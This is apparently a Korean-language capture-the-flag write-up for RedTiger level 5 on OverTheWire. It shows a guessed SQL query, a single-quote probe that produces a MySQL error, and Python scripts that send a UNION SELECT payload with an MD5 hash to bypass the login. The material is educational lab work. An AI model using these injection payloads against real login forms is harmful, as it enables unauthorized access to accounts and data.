================================================================================================================
[redtiger] level5
================================================================================================================

|

.. graphviz::

    digraph G {
        rankdir="LR";
        node[shape="point"];
        edge[arrowhead="none"]

        {
            rank="same";
            "client"[shape="plaintext"];
            "client" -> step0 -> step2 -> step4 -> step6 -> step8;
        }

        {
            rank="same";
            "server"[shape="plaintext"];
            "server" -> step1 -> step3 -> step5 -> step7 -> step9;
        }
        step0 -> step1[label="post_data: {username='&password='}",arrowhead="normal"];
        step3 -> step2[label="Error Page",arrowhead="normal"];
        step4 -> step5[label="post_data: {username=' union select 'joizel','0cc175b9c0f1b6a831c399e269772661&password=a&login=Login}",arrowhead="normal"];
        step7 -> step6[label="login success",arrowhead="normal"];
    }

|

server -> DB 예측
================================================================================================================

- Disabled: substring , substr, ( , ), mid
- POST 파라미터: username, password
- Hints: its not a blind, the password is md5-crypted, watch the login errors

.. code-block:: sql

    SELECT * FROM tb_name where 
    username='$_POST["username"]' AND 
    password='$_POST["password"]'    

|

quote
================================================================================================================

.. code-block:: python

    import requests

    requests.packages.urllib3.disable_warnings()

    url = "https://redtiger.labs.overthewire.org/level5.php"
    cookies = {
        "level5login":"bananas_are_not_yellow-sometimes"
    }

    params = {
        "username": "'",
        "password": "'"
    }
    
    r = requests.post(url, cookies=cookies, params=params, verify=False)
    print r.content

|

.. code-block:: html

    Warning: mysql_num_rows() expects parameter 1 to be resource, 
    boolean given in /var/www/hackit/level5.php on line 46
    User not found!

|

union select
================================================================================================================

- 데이터 추출

.. code-block:: python

    import requests

    requests.packages.urllib3.disable_warnings()

    url = "https://redtiger.labs.overthewire.org/level5.php"
    cookies = {
        "level5login":"bananas_are_not_yellow-sometimes"
    }

    params = {
        "mode": "login"
    }

    # a => 0cc175b9c0f1b6a831c399e269772661
    payloads = {
        "username": "' union select 'joizel', '0cc175b9c0f1b6a831c399e269772661",
        "password": "a",
        "login": "Login"
    }

    r = requests.post(url, cookies=cookies, params=params, data=payloads, verify=False)
    print r.content


|